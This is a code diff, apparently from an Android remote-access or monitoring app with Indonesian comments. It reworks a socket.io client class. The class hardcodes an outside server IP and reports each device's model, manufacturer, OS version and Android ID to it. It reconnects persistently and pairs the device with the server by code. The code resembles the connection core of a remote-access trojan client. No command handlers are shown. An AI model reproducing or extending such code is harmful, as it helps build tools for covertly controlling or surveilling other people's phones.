@@ -4,16 +4,18 @@ import android.os.Build;
 import android.provider.Settings;
 import android.content.Context;
 import android.content.SharedPreferences;
+import android.util.Log;
 import java.net.URISyntaxException;
 import io.socket.client.IO;
 import io.socket.client.Socket;
 
 public class IOSocket {
+    private static final String TAG = "IOSocket";
     private static IOSocket ourInstance = new IOSocket();
     private io.socket.client.Socket ioSocket;
 
     // ===============================================
-    // HARDCODE IP SERVER ANDA DI SINI (IP VPS)
+    // IP SERVER VPS ANDA
     // ===============================================
     private static final String SERVER_URL = "http://41.216.190.191:42474";
 
@@ -30,23 +32,19 @@ public class IOSocket {
     }
 
     /**
-     * Inisialisasi socket dengan pairing code
-     * IP server sudah fixed, tinggal kirim pairing code
+     * Inisialisasi socket TANPA pairing code dulu
+     * Koneksi dulu, baru kirim pairing code
      */
-    public void initSocket(Context context, String pairingCode) {
+    public void initSocket(Context context) {
         try {
-            // Simpan pairing code
-            SharedPreferences prefs = context.getSharedPreferences(PREFS_NAME, Context.MODE_PRIVATE);
-            prefs.edit()
-                    .putString(KEY_PAIRING_CODE, pairingCode)
-                    .putBoolean(KEY_IS_PAIRED, true)
-                    .apply();
-
-            // Dapatkan device ID
             String deviceID = Settings.Secure.getString(
                     context.getContentResolver(),
                     Settings.Secure.ANDROID_ID
             );
+
+            Log.d(TAG, "Initializing socket...");
+            Log.d(TAG, "Server URL: " + SERVER_URL);
+            Log.d(TAG, "Device ID: " + deviceID);
 
             // Konfigurasi socket
             IO.Options opts = new IO.Options();
@@ -54,32 +52,119 @@ public class IOSocket {
             opts.reconnection = true;
             opts.reconnectionDelay = 5000;
             opts.reconnectionDelayMax = 60000;
+            opts.forceNew = true;
 
-            // Buat URL dengan pairing code di query string
+            // URL dengan device info TANPA pairing code
             String fullUrl = SERVER_URL +
                     "?model=" + android.net.Uri.encode(Build.MODEL) +
                     "&manf=" + android.net.Uri.encode(Build.MANUFACTURER) +
                     "&release=" + android.net.Uri.encode(Build.VERSION.RELEASE) +
-                    "&id=" + deviceID +
-                    "&pairing_code=" + pairingCode;  // ← KUNCI UTAMA!
+                    "&id=" + deviceID;
+
+            Log.d(TAG, "Connecting to: " + fullUrl);
 
             ioSocket = IO.socket(fullUrl, opts);
 
+            // Setup listeners
+            setupConnectionListeners(context);
+
+            Log.d(TAG, "Socket initialized successfully");
+
         } catch (URISyntaxException e) {
+            Log.e(TAG, "URI Syntax Error: " + e.getMessage());
+            e.printStackTrace();
+        } catch (Exception e) {
+            Log.e(TAG, "Error initializing socket: " + e.getMessage());
             e.printStackTrace();
         }
     }
 
     /**
-     * Reconnect dengan pairing code tersimpan
+     * Setup connection listeners
      */
-    public void reconnectWithSavedData(Context context) {
-        SharedPreferences prefs = context.getSharedPreferences(PREFS_NAME, Context.MODE_PRIVATE);
-        String pairingCode = prefs.getString(KEY_PAIRING_CODE, null);
-
-        if (pairingCode != null) {
-            initSocket(context, pairingCode);
+    private void setupConnectionListeners(final Context context) {
+        if (ioSocket == null) {
+            Log.e(TAG, "Socket is null, cannot setup listeners");
+            return;
         }
+
+        ioSocket.on(Socket.EVENT_CONNECT, new io.socket.emitter.Emitter.Listener() {
+            @Override
+            public void call(Object... args) {
+                Log.d(TAG, "✅ Connected to server!");
+
+                // Jika sudah paired sebelumnya, kirim pairing code otomatis
+                SharedPreferences prefs = context.getSharedPreferences(PREFS_NAME, Context.MODE_PRIVATE);
+                String savedCode = prefs.getString(KEY_PAIRING_CODE, null);
+
+                if (savedCode != null) {
+                    Log.d(TAG, "Found saved pairing code, sending...");
+                    sendPairingCode(savedCode);
+                } else {
+                    Log.d(TAG, "No saved pairing code found");
+                }
+            }
+        });
+
+        ioSocket.on(Socket.EVENT_CONNECT_ERROR, new io.socket.emitter.Emitter.Listener() {
+            @Override
+            public void call(Object... args) {
+                Log.e(TAG, "❌ Connection error: " + (args.length > 0 ? args[0] : "unknown"));
+            }
+        });
+
+        ioSocket.on(Socket.EVENT_DISCONNECT, new io.socket.emitter.Emitter.Listener() {
+            @Override
+            public void call(Object... args) {
+                Log.w(TAG, "⚠️ Disconnected from server");
+            }
+        });
+
+        ioSocket.on(Socket.EVENT_RECONNECT, new io.socket.emitter.Emitter.Listener() {
+            @Override
+            public void call(Object... args) {
+                Log.d(TAG, "🔄 Reconnected to server");
+            }
+        });
+    }
+
+    /**
+     * Kirim pairing code setelah terkoneksi
+     */
+    public void sendPairingCode(String pairingCode) {
+        try {
+            if (ioSocket == null) {
+                Log.e(TAG, "Socket is null!");
+                return;
+            }
+
+            if (!ioSocket.connected()) {
+                Log.e(TAG, "Socket not connected!");
+                return;
+            }
+
+            org.json.JSONObject pairData = new org.json.JSONObject();
+            pairData.put("pairing_code", pairingCode);
+
+            Log.d(TAG, "Sending pairing code: " + pairingCode);
+            ioSocket.emit("pair_device", pairData);
+
+        } catch (Exception e) {
+            Log.e(TAG, "Error sending pairing code: " + e.getMessage());
+            e.printStackTrace();
+        }
+    }
+
+    /**
+     * Simpan pairing code setelah berhasil
+     */
+    public void savePairingCode(Context context, String pairingCode) {
+        SharedPreferences prefs = context.getSharedPreferences(PREFS_NAME, Context.MODE_PRIVATE);
+        prefs.edit()
+                .putString(KEY_PAIRING_CODE, pairingCode)
+                .putBoolean(KEY_IS_PAIRED, true)
+                .apply();
+        Log.d(TAG, "Pairing code saved");
     }
 
     /**
@@ -109,9 +194,34 @@ public class IOSocket {
             ioSocket.disconnect();
             ioSocket = null;
         }
+        Log.d(TAG, "Pairing cleared");
+    }
+
+    /**
+     * Connect socket
+     */
+    public void connect() {
+        if (ioSocket != null && !ioSocket.connected()) {
+            Log.d(TAG, "Connecting socket...");
+            ioSocket.connect();
+        }
+    }
+
+    /**
+     * Disconnect socket
+     */
+    public void disconnect() {
+        if (ioSocket != null && ioSocket.connected()) {
+            Log.d(TAG, "Disconnecting socket...");
+            ioSocket.disconnect();
+        }
     }
 
     public Socket getIoSocket() {
         return ioSocket;
+    }
+
+    public boolean isConnected() {
+        return ioSocket != null && ioSocket.connected();
     }
 }
